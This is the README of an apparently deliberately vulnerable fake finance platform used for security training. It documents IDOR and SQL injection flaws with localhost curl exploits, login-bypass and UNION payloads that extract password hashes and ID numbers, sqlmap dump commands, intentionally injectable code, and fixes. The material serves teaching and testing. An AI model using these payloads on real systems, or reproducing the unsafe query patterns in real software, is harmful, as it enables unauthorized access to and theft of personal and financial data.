# 云享财富 - 水平越权漏洞演示靶机

## 项目简介

本项目是一个用于安全教育的靶机环境，模拟了一个真实的互联网理财平台。系统中故意设置了多处**水平越权（IDOR - Insecure Direct Object Reference）**漏洞，用于演示此类漏洞的危害和原理。

> **警告**：本系统仅用于安全教育和授权渗透测试，请勿用于非法用途！

## 什么是水平越权漏洞？

水平越权（Horizontal Privilege Escalation）是指在同一权限级别下，用户可以访问或操作其他用户的资源。这通常发生在应用程序仅通过用户提交的资源ID来获取数据，而没有验证该资源是否属于当前登录用户。

### 漏洞示意图

```
正常流程:
用户A 登录 → 请求 /api/profile?user_id=1 → 返回用户A的信息 ✓

漏洞利用:
用户A 登录 → 请求 /api/profile?user_id=2 → 返回用户B的信息 ✗ (越权!)
```

## 快速开始

### 1. 安装依赖

```bash
pip install -r requirements.txt
```

### 2. 初始化数据库

```bash
python init_db.py
```

### 3. 启动应用

```bash
python app.py
```

### 4. 访问系统

打开浏览器访问：http://localhost:5000

## 测试账号

| 用户名 | 密码 | 姓名 |
|--------|------|------|
| zhangsan | 123456 | 张三 |
| lisi | 123456 | 李四 |
| wangwu | 123456 | 王五 |
| zhaoliu | 123456 | 赵六 |
| sunqi | 123456 | 孙七 |

## 漏洞清单

### 漏洞1：查看任意用户个人信息

**漏洞位置**：`/api/profile`

**漏洞描述**：接口接受外部传入的 `user_id` 参数，未验证该ID是否属于当前登录用户。

**利用方式**：
```bash
# 登录后，修改 user_id 参数查看其他用户信息
curl "http://localhost:5000/api/profile?user_id=1"
curl "http://localhost:5000/api/profile?user_id=2"
curl "http://localhost:5000/api/profile?user_id=3"
```

**可获取的敏感信息**：
- 用户真实姓名
- 身份证号码
- 手机号码
- 邮箱地址
- 家庭住址

---

### 漏洞2：修改任意用户个人信息

**漏洞位置**：`PUT /api/profile`

**漏洞描述**：接口接受外部传入的 `user_id` 参数进行更新操作，未验证资源归属。

**利用方式**：
```bash
curl -X PUT "http://localhost:5000/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 2, "phone": "13999999999"}'
```

---

### 漏洞3：查看任意用户账户余额和交易记录

**漏洞位置**：`/api/account/<account_id>`

**漏洞描述**：通过账户ID直接查询数据，未验证账户所属用户。

**利用方式**：
```bash
# 遍历账户ID查看所有用户的账户信息
curl "http://localhost:5000/api/account/1"
curl "http://localhost:5000/api/account/2"
curl "http://localhost:5000/api/account/3"
```

**可获取的敏感信息**：
- 账户余额
- 冻结金额
- 完整交易记录
- 交易对手账号

---

### 漏洞4：查看任意用户银行卡信息

**漏洞位置**：`/api/card/<card_id>`

**漏洞描述**：通过银行卡ID直接查询数据，未验证银行卡所属用户。

**利用方式**：
```bash
curl "http://localhost:5000/api/card/1"
curl "http://localhost:5000/api/card/2"
curl "http://localhost:5000/api/card/3"
```

**可获取的敏感信息**：
- 完整银行卡号
- 持卡人姓名
- 绑定手机号
- 开户银行

---

### 漏洞5：查看任意用户站内消息

**漏洞位置**：`/api/message/<message_id>`

**漏洞描述**：通过消息ID直接查询数据，未验证消息所属用户。

**利用方式**：
```bash
curl "http://localhost:5000/api/message/1"
curl "http://localhost:5000/api/message/2"
curl "http://localhost:5000/api/message/3"
```

**可获取的敏感信息**：
- 交易验证码
- 安全警告信息
- 账户变动通知

---

### 漏洞6：删除任意用户站内消息

**漏洞位置**：`DELETE /api/message/<message_id>`

**漏洞描述**：通过消息ID直接删除消息，未验证消息所属用户。

**利用方式**：
```bash
curl -X DELETE "http://localhost:5000/api/message/1"
```

---

### 漏洞7：非法转账（从他人账户转账）

**漏洞位置**：`POST /api/transfer`

**漏洞描述**：转账接口未验证转出账户是否属于当前登录用户。

**利用方式**：
```bash
# 从其他用户账户转账到自己账户
curl -X POST "http://localhost:5000/api/transfer" \
  -H "Content-Type: application/json" \
  -d '{
    "from_account_id": 3,
    "to_account_no": "YX20240001001",
    "amount": 10000
  }'
```

---

### 漏洞8：SQL注入 —— 登录接口（万能密码绕过）

**漏洞位置**：`POST /login`（`app.py`，`login` 函数）

**漏洞描述**：username 和 password 均直接拼入同一条 SQL，攻击者在用户名中注入 `' OR '1'='1'--` 即可注释掉密码校验，以任意密码登录任意账号。

**触发条件**：在登录页面的用户名框输入注入语句，密码随便填，无需任何权限。

**漏洞代码片段**（`app.py`，`login` 函数）：
```python
row = db.session.execute(
    text(f"SELECT id FROM users WHERE username = '{username}' AND password_hash = '{password}'")
).fetchone()
if row:
    user = User.query.get(row[0])
    login_user(user)
```

**手工验证**：
```bash
# 万能密码，密码填任意字符，直接登录成功（HTTP 302）
curl -i -X POST "http://localhost:5000/login" \
  -d "username=' OR '1'='1'--&password=随便填"

# 也可以指定登录某个用户
curl -i -X POST "http://localhost:5000/login" \
  -d "username=lisi'--&password=随便填"
```

**sqlmap 扫描命令**：
```bash
sqlmap -u "http://localhost:5000/login" \
  --data="username=test&password=test" \
  --dbms=sqlite --technique=B --level=2 --dump
```

---

### 漏洞9：SQL注入 —— 账户交易记录搜索（字符串型）

**漏洞位置**：`GET /api/account/<id>?keyword=`（`app.py`，`api_get_account` 函数）

**漏洞描述**：账户详情接口支持通过 `keyword` 参数按备注关键字搜索交易记录，该参数被直接拼入 SQL 的 `LIKE` 子句，未做参数化处理。攻击者可通过闭合引号注入任意 SQL，配合 UNION 查询获取其他表的数据。

**触发条件**：登录后访问自己的账户详情，传入恶意 `keyword` 参数。

**漏洞代码片段**（`app.py`，`api_get_account` 函数）：
```python
trans_sql = f"""
    SELECT id, trans_type, amount, balance_after, description, target_account, created_at
    FROM transactions
    WHERE account_id = {account_id}
      AND (description LIKE '%{keyword}%' OR target_account LIKE '%{keyword}%')
    ORDER BY created_at DESC LIMIT 50
"""
rows = db.session.execute(text(trans_sql)).fetchall()
```

**手工验证**：
```bash
# 正常请求
curl -b "session=<Cookie>" "http://localhost:5000/api/account/1?keyword=转账"

# 注入验证（万能条件，返回全部交易记录）
curl -b "session=<Cookie>" \
  "http://localhost:5000/api/account/1?keyword=%' OR '1'='1"

# UNION联合查询（读取所有用户的用户名和密码哈希）
curl -b "session=<Cookie>" \
  "http://localhost:5000/api/account/1?keyword=%' UNION SELECT id,username,password_hash,phone,email,created_at FROM users-- "
```

**sqlmap 扫描命令**：
```bash
# 先登录系统获取 Session Cookie，再执行
sqlmap -u "http://localhost:5000/api/account/1?keyword=test" \
  --cookie="session=<登录后的Session Cookie>" \
  --dbms=sqlite \
  --level=3 --risk=2 \
  --technique=U \
  --dump-all --batch
```

---

### 漏洞10：SQL注入 —— 消息列表类型筛选（字符串型）

**漏洞位置**：`GET /api/messages?type=`（`app.py`，`api_get_messages` 函数）

**漏洞描述**：消息列表接口支持通过 `type` 参数按消息类型筛选，该参数被直接拼入 SQL 查询，未使用参数化处理。攻击者可通过注入绕过 `user_id` 限制，读取其他用户的消息，或进一步进行 UNION 查询获取任意数据。

**触发条件**：登录后访问消息中心，在 `type` 参数中传入注入语句。

**漏洞代码片段**（`app.py`，`api_get_messages` 函数）：
```python
sql = f"""
    SELECT id, title, msg_type, is_read, created_at
    FROM messages
    WHERE user_id = {current_user.id} AND msg_type = '{msg_type}'
    ORDER BY created_at DESC
"""
rows = db.session.execute(text(sql)).fetchall()
```

**手工验证**：
```bash
# 正常请求
curl -b "session=<Cookie>" "http://localhost:5000/api/messages?type=系统通知"

# 注入绕过 user_id，读取所有用户的全部消息
curl -b "session=<Cookie>" \
  "http://localhost:5000/api/messages?type=' OR '1'='1"

# UNION联合查询（读取所有用户身份证号）
curl -b "session=<Cookie>" \
  "http://localhost:5000/api/messages?type=' UNION SELECT id,real_name,id_card,is_read,created_at FROM users-- "
```

**sqlmap 扫描命令**：
```bash
sqlmap -u "http://localhost:5000/api/messages?type=test" \
  --cookie="session=<登录后的Session Cookie>" \
  --dbms=sqlite \
  --level=2 --risk=1 \
  --technique=BU \
  --dump-all --batch
```

## 漏洞修复方案

### 错误代码示例

```python
@app.route('/api/profile')
@login_required
def api_get_profile():
    user_id = request.args.get('user_id')
    user = User.query.get(user_id)  # 危险：未验证归属
    return jsonify(user.to_dict())
```

### 正确代码示例

```python
# 方案1：不接受外部参数，只返回当前用户信息
@app.route('/api/profile')
@login_required
def api_get_profile():
    user = current_user  # 安全：只使用当前登录用户
    return jsonify(user.to_dict())

# 方案2：验证资源归属关系
@app.route('/api/account/<int:account_id>')
@login_required
def api_get_account(account_id):
    # 安全：同时验证ID和归属
    account = Account.query.filter_by(
        id=account_id,
        user_id=current_user.id
    ).first()

    if not account:
        return jsonify({'error': '无权访问该资源'}), 403

    return jsonify(account.to_dict())
```

### 安全接口对比

系统中提供了安全版本的API供对比学习：
- `/api/secure/profile` - 安全的个人信息接口
- `/api/secure/account/<id>` - 安全的账户信息接口

## 自动化测试脚本

```python
#!/usr/bin/env python3
"""水平越权漏洞批量检测脚本"""

import requests

BASE_URL = "http://localhost:5000"
SESSION = requests.Session()

# 登录获取会话
def login(username, password):
    resp = SESSION.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": password
    })
    return resp.status_code == 200

# 测试用户信息越权
def test_profile_idor():
    print("[*] 测试用户信息越权漏洞...")
    for user_id in range(1, 6):
        resp = SESSION.get(f"{BASE_URL}/api/profile?user_id={user_id}")
        if resp.status_code == 200:
            data = resp.json()
            print(f"  [!] 获取到用户{user_id}信息: {data['data']['real_name']}")

# 测试账户信息越权
def test_account_idor():
    print("[*] 测试账户信息越权漏洞...")
    for account_id in range(1, 10):
        resp = SESSION.get(f"{BASE_URL}/api/account/{account_id}")
        if resp.status_code == 200:
            data = resp.json()
            print(f"  [!] 账户{account_id}: 余额 ¥{data['data']['balance']}")

if __name__ == "__main__":
    if login("zhangsan", "123456"):
        print("[+] 登录成功\n")
        test_profile_idor()
        print()
        test_account_idor()
```

## 项目结构

```
Target/
├── app.py              # Flask主应用（包含漏洞代码）
├── init_db.py          # 数据库初始化脚本
├── requirements.txt    # Python依赖
├── static/
│   ├── css/
│   │   └── style.css   # 样式文件
│   └── js/
│       └── main.js     # 前端JavaScript
├── templates/
│   ├── base.html       # 基础模板
│   ├── index.html      # 首页
│   ├── login.html      # 登录页
│   ├── register.html   # 注册页
│   ├── dashboard.html  # 仪表盘
│   ├── profile.html    # 个人信息
│   ├── accounts.html   # 账户列表
│   ├── account_detail.html  # 账户详情
│   ├── cards.html      # 银行卡管理
│   └── messages.html   # 消息中心
└── README.md           # 说明文档
```

## 使用场景

1. **安全培训**：向开发人员展示水平越权漏洞的危害
2. **渗透测试练习**：作为CTF或渗透测试的练习靶机
3. **安全意识教育**：向非技术人员展示数据泄露的风险
4. **代码审计学习**：学习如何识别和修复此类漏洞

## 免责声明

本项目仅供安全研究和教育目的使用。使用者应当遵守相关法律法规，对于因使用本项目而产生的任何直接或间接损失，作者不承担任何责任。

## License

MIT License
